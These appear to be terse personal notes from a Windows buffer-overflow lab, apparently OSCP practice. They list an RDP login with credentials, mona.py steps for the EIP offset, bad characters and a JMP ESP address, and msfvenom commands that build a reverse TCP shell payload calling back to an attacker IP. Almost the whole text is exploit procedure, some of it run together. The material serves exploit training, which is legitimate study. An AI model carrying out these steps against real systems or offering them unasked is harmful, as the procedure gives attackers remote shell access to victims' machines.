```
xfreerdp /u:admin /p:password /cert:ignore /v:10.10.83.194 /workarea  
```

```
!mona config -set workingfolder c:\mona\%p
/opt/metasploit-framework/embedded/framework/tools/exploit/pattern_create.rb -l 1500
!mona findmsp -distance 1500
EIP: 1034
#Update EIP to all scripts

!mona bytearray -b "\x00"

1. Send data with NULL
2. Take ESP OUT and put into COMPARE. 

## Don't forget extending the windows to right on BadChars. 
# !mona compare -f C:\mona\oscp\bytearray.bin -a 01A0FA30
!mona compare -f C:\mona\oscp\bytearray.bin -a 000000

#python bytearray.py
# Send updated Removed Bad Char buffer to target
!mona bytearray -b "\x00\x08\x2c\xad"

# Update Offset on Python
"\\x00\\x16\\x2f\\xf4\\xfd"

# Verify with new ESP on Immunity Debugger

!mona jmp -r esp -cpb "\x00\x08\x2c\xad"
!mona bytearray -b "\x00"

JMP ESP: "\xaf\x11\x50\x62"

msfvenom -p windows/shell_reverse_tcp LHOST=10.6.20.231 LPORT=4444 EXITFUNC=thread -b "\x00\x08\x2c\xad" -f py

!mona config -set workingfolder c:\mona\%p

/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 600
!mona findmsp -distance 600!mona bytearray -b "\x00"
!mona compare -f C:\mona\oscp\bytearray.bin -a <address>
!mona jmp -r esp -cpb "\x00"
msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -b "\x00" -f py
!mona config -set workingfolder c:\mona\%p
```
![image](https://user-images.githubusercontent.com/9059079/119589298-85138c80-bda0-11eb-825d-862e4f241a10.png)

![image](https://user-images.githubusercontent.com/9059079/119571250-1d991500-bd7f-11eb-9cb0-ca9bd73dc2f7.png)
